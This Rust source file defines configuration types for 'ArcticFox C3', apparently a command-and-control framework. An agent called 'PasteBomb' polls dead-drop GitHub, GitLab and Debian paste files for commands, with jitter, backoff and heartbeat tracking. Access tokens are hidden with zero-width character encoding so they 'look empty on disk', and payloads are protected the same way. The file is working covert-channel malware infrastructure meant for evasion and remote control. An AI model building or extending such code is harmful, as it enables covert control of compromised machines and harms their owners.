//! Configuration types for ArcticFox C3.
//!
//! All configuration is serde-driven, loaded from JSON files.
//! Types are shared between the agent, API server, and control tool.

use serde::{Deserialize, Serialize};
use std::path::Path;

use crate::crypto::generate_token;
use crate::error::{ArcticFoxError, Result};

// ── Repo Target (used by control tool / API) ────────────────────────────────

/// A dead-drop repository target for command delivery.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RepoTarget {
    pub owner: String,
    pub repo: String,
    #[serde(default = "default_platform")]
    pub platform: String,
    #[serde(default = "default_branch")]
    pub branch: String,
    #[serde(default = "default_file_path")]
    pub file_path: String,
    #[serde(default = "default_true")]
    pub alive: bool,
}

fn default_platform() -> String {
    "github".into()
}
fn default_branch() -> String {
    "main".into()
}
fn default_file_path() -> String {
    "README.md".into()
}
fn default_true() -> bool {
    true
}

impl RepoTarget {
    /// Human-readable label for this repo.
    pub fn label(&self) -> String {
        if self.platform == "debian" {
            format!("[debian] paste:{}", self.repo)
        } else {
            format!("[{}] {}/{}", self.platform, self.owner, self.repo)
        }
    }

    /// The raw content URL for this repo.
    pub fn raw_url(&self) -> String {
        match self.platform.as_str() {
            "debian" => format!("https://paste.debian.net/plain/{}", self.repo),
            "gitlab" => format!(
                "https://gitlab.com/{}/{}/-/raw/{}/{}",
                self.owner, self.repo, self.branch, self.file_path
            ),
            _ => format!(
                "https://raw.githubusercontent.com/{}/{}/{}/{}",
                self.owner, self.repo, self.branch, self.file_path
            ),
        }
    }

    /// The API URL for this repo (for authenticated access).
    pub fn api_url(&self) -> String {
        match self.platform.as_str() {
            "debian" => self.raw_url(),
            "gitlab" => {
                let encoded_path =
                    url::form_urlencoded::byte_serialize(self.file_path.as_bytes())
                        .collect::<String>();
                let project_id = url::form_urlencoded::byte_serialize(
                    format!("{}/{}", self.owner, self.repo).as_bytes(),
                )
                .collect::<String>();
                format!(
                    "https://gitlab.com/api/v4/projects/{}/repository/files/{}/raw?ref={}",
                    project_id, encoded_path, self.branch
                )
            }
            _ => format!(
                "https://api.github.com/repos/{}/{}/contents/{}?ref={}",
                self.owner, self.repo, self.file_path, self.branch
            ),
        }
    }
}

// ── Repo Source (used by agent) ─────────────────────────────────────────────

/// A repo source the agent polls for commands.
/// Includes runtime state (fail counts, timestamps) for self-healing.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RepoSource {
    pub owner: String,
    pub repo: String,
    #[serde(default = "default_platform")]
    pub platform: String,
    #[serde(default = "default_branch")]
    pub branch: String,
    #[serde(default = "default_file_path")]
    pub file_path: String,
    #[serde(default = "default_true")]
    pub active: bool,
    #[serde(default)]
    pub fail_count: u32,
    #[serde(default)]
    pub last_success: f64,
    #[serde(default)]
    pub last_fail: f64,
}

impl RepoSource {
    pub fn label(&self) -> String {
        if self.platform == "debian" {
            format!("[debian] paste:{}", self.repo)
        } else {
            format!("[{}] {}/{}", self.platform, self.owner, self.repo)
        }
    }

    pub fn raw_url(&self) -> String {
        if self.platform == "debian" {
            format!("https://paste.debian.net/plain/{}", self.repo)
        } else if self.platform == "gitlab" {
            format!(
                "https://gitlab.com/{}/{}/-/raw/{}/{}",
                self.owner, self.repo, self.branch, self.file_path
            )
        } else {
            format!(
                "https://raw.githubusercontent.com/{}/{}/{}/{}",
                self.owner, self.repo, self.branch, self.file_path
            )
        }
    }

    pub fn api_url(&self) -> String {
        match self.platform.as_str() {
            "debian" => self.raw_url(),
            "gitlab" => {
                let encoded_path =
                    url::form_urlencoded::byte_serialize(self.file_path.as_bytes())
                        .collect::<String>();
                let project_id = url::form_urlencoded::byte_serialize(
                    format!("{}/{}", self.owner, self.repo).as_bytes(),
                )
                .collect::<String>();
                format!(
                    "https://gitlab.com/api/v4/projects/{}/repository/files/{}/raw?ref={}",
                    project_id, encoded_path, self.branch
                )
            }
            _ => format!(
                "https://api.github.com/repos/{}/{}/contents/{}?ref={}",
                self.owner, self.repo, self.file_path, self.branch
            ),
        }
    }

    /// Compute exponential backoff duration based on consecutive failures.
    pub fn backoff_duration(&self, base_interval: u64) -> std::time::Duration {
        let multiplier = 2u64.saturating_pow(self.fail_count.min(10));
        let secs = (multiplier * base_interval).min(3600);
        std::time::Duration::from_secs(secs)
    }
}

// ── Config Types ────────────────────────────────────────────────────────────

/// Agent (PasteBomb) configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    #[serde(default)]
    pub repos: Vec<RepoSource>,
    #[serde(default = "default_poll_interval")]
    pub poll_interval: u64,
    #[serde(default = "default_jitter")]
    pub jitter: u64,
    #[serde(default = "default_max_fails")]
    pub max_fails_before_skip: u32,
    #[serde(default)]
    pub use_api: bool,
    #[serde(default)]
    pub last_command_hash: String,
}

fn default_poll_interval() -> u64 {
    60
}
fn default_jitter() -> u64 {
    15
}
fn default_max_fails() -> u32 {
    5
}

impl AgentConfig {
    /// Load from a JSON file, or return defaults if the file doesn't exist.
    pub fn load(path: &Path) -> Result<Self> {
        if !path.exists() {
            return Ok(Self::default());
        }
        let content = std::fs::read_to_string(path).map_err(|e| ArcticFoxError::FileRead {
            path: path.to_path_buf(),
            source: e,
        })?;
        serde_json::from_str(&content).map_err(|e| ArcticFoxError::JsonContext {
            context: format!("loading agent config from {}", path.display()),
            source: e,
        })
    }

    /// Save to a JSON file atomically (write to tmp, then rename).
    pub fn save(&self, path: &Path) -> Result<()> {
        let json =
            serde_json::to_string_pretty(self).map_err(|e| ArcticFoxError::JsonContext {
                context: "serializing agent config".into(),
                source: e,
            })?;
        let tmp = path.with_extension("tmp");
        std::fs::write(&tmp, &json).map_err(|e| ArcticFoxError::FileWrite {
            path: tmp.clone(),
            source: e,
        })?;
        std::fs::rename(&tmp, path).map_err(|e| ArcticFoxError::AtomicReplace {
            path: path.to_path_buf(),
            source: e,
        })?;
        Ok(())
    }
}

impl Default for AgentConfig {
    fn default() -> Self {
        AgentConfig {
            repos: Vec::new(),
            poll_interval: 60,
            jitter: 15,
            max_fails_before_skip: 5,
            use_api: false,
            last_command_hash: String::new(),
        }
    }
}

/// Control tool configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ControlConfig {
    #[serde(default)]
    pub github_token: String,
    #[serde(default)]
    pub gitlab_token: String,
    #[serde(default)]
    pub repos: Vec<RepoTarget>,
    #[serde(default)]
    pub commands: Vec<String>,
    #[serde(default)]
    pub heartbeat_redirect: String,
    #[serde(default)]
    pub heartbeat_tracking: String,
    #[serde(default = "default_heartbeat_interval")]
    pub heartbeat_interval: u64,
    /// Session key for encrypt-then-ZW payload protection (64 hex chars).
    #[serde(default)]
    pub session_key: String,
}

fn default_heartbeat_interval() -> u64 {
    300
}

impl ControlConfig {
    pub fn load(path: &Path) -> Result<Self> {
        if !path.exists() {
            return Ok(Self::default());
        }
        let content = std::fs::read_to_string(path).map_err(|e| ArcticFoxError::FileRead {
            path: path.to_path_buf(),
            source: e,
        })?;
        let mut cfg: ControlConfig = serde_json::from_str(&content).map_err(|e| ArcticFoxError::JsonContext {
            context: format!("loading control config from {}", path.display()),
            source: e,
        })?;
        // Decode ZW-encoded fields if present
        cfg.github_token = Self::zw_decode_if_present(&cfg.github_token);
        cfg.gitlab_token = Self::zw_decode_if_present(&cfg.gitlab_token);
        cfg.session_key = Self::zw_decode_if_present(&cfg.session_key);
        Ok(cfg)
    }

    fn zw_decode_if_present(value: &str) -> String {
        if value.is_empty() { return value.to_string(); }
        if let Ok(decoded) = crate::zwcodec::decode(value) {
            String::from_utf8_lossy(&decoded).to_string()
        } else {
            value.to_string()
        }
    }

    pub fn save(&self, path: &Path) -> Result<()> {
        // ZW-encode tokens and session key for at-rest protection
        let mut protected = self.clone();
        protected.github_token = crate::zwcodec::encode(protected.github_token.as_bytes());
        protected.gitlab_token = crate::zwcodec::encode(protected.gitlab_token.as_bytes());
        if !protected.session_key.is_empty() {
            protected.session_key = crate::zwcodec::encode(protected.session_key.as_bytes());
        }

        let json =
            serde_json::to_string_pretty(&protected).map_err(|e| ArcticFoxError::JsonContext {
                context: "serializing control config".into(),
                source: e,
            })?;
        let tmp = path.with_extension("tmp");
        std::fs::write(&tmp, &json).map_err(|e| ArcticFoxError::FileWrite {
            path: tmp.clone(),
            source: e,
        })?;
        std::fs::rename(&tmp, path).map_err(|e| ArcticFoxError::AtomicReplace {
            path: path.to_path_buf(),
            source: e,
        })?;
        Ok(())
    }
}

impl Default for ControlConfig {
    fn default() -> Self {
        ControlConfig {
            github_token: String::new(),
            gitlab_token: String::new(),
            repos: Vec::new(),
            commands: Vec::new(),
            heartbeat_redirect: String::new(),
            heartbeat_tracking: String::new(),
            heartbeat_interval: 300,
            session_key: String::new(),
        }
    }
}

/// API server configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApiConfig {
    #[serde(default)]
    pub admin_token: String,
    #[serde(default)]
    pub lints_token: String,
    #[serde(default = "default_host")]
    pub host: String,
    #[serde(default = "default_port")]
    pub port: u16,
    #[serde(default)]
    pub use_pad: bool,
}

fn default_host() -> String {
    "0.0.0.0".into()
}
fn default_port() -> u16 {
    7443
}

impl ApiConfig {
    /// Load config, auto-generating tokens if they don't exist.
    pub fn load_or_init(path: &Path) -> Result<Self> {
        if !path.exists() {
            let cfg = ApiConfig {
                admin_token: generate_token(),
                lints_token: generate_token(),
                host: default_host(),
                port: default_port(),
                use_pad: false,
            };
            cfg.save(path)?;
            return Ok(cfg);
        }
        let content = std::fs::read_to_string(path).map_err(|e| ArcticFoxError::FileRead {
            path: path.to_path_buf(),
            source: e,
        })?;
        let mut cfg: ApiConfig =
            serde_json::from_str(&content).map_err(|e| ArcticFoxError::JsonContext {
                context: format!("loading API config from {}", path.display()),
                source: e,
            })?;

        // Decode ZW-encoded tokens if they were saved with protection
        if let Ok(decoded) = crate::zwcodec::decode(&cfg.admin_token) {
            cfg.admin_token = String::from_utf8_lossy(&decoded).to_string();
        }
        if let Ok(decoded) = crate::zwcodec::decode(&cfg.lints_token) {
            cfg.lints_token = String::from_utf8_lossy(&decoded).to_string();
        }

        // Auto-generate tokens if empty
        if cfg.admin_token.is_empty() {
            cfg.admin_token = generate_token();
        }
        if cfg.lints_token.is_empty() {
            cfg.lints_token = generate_token();
        }
        Ok(cfg)
    }

    pub fn save(&self, path: &Path) -> Result<()> {
        // ZW-encode tokens for at-rest protection — tokens look empty on disk
        let mut protected = self.clone();
        protected.admin_token = crate::zwcodec::encode(protected.admin_token.as_bytes());
        protected.lints_token = crate::zwcodec::encode(protected.lints_token.as_bytes());

        let json =
            serde_json::to_string_pretty(&protected).map_err(|e| ArcticFoxError::JsonContext {
                context: "serializing API config".into(),
                source: e,
            })?;
        let tmp = path.with_extension("tmp");
        std::fs::write(&tmp, &json).map_err(|e| ArcticFoxError::FileWrite {
            path: tmp.clone(),
            source: e,
        })?;
        std::fs::rename(&tmp, path).map_err(|e| ArcticFoxError::AtomicReplace {
            path: path.to_path_buf(),
            source: e,
        })?;
        Ok(())
    }
}
